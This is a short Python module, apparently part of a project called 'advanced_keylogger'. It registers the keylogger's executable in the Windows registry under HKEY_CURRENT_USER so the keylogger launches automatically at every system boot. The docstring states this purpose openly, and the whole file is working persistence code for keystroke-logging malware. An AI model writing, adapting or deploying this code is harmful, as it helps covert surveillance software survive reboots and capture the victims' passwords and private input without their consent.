import os
import sys
import winreg
import settings #use advanced_keylogger.settings
import ctypes

class AddToRegistry():

    """
        Let you add the keylogger to registry\n
        Once it has been added, it automatically starts up the keylogger anytime the system boots\n
        To ensure that this works you might need to edit the settings file

    """

    def __init__(self):

        open_registry = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, settings.REGISTRY_KEY_VALUE, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValue(open_registry, settings.REGISTRY_APP_NAME,
                        winreg.REG_SZ, settings.EXECUTABLE_FILE_PATH)

        winreg.CloseKey(open_registry)

if __name__ == "__main__":

    AddToRegistry()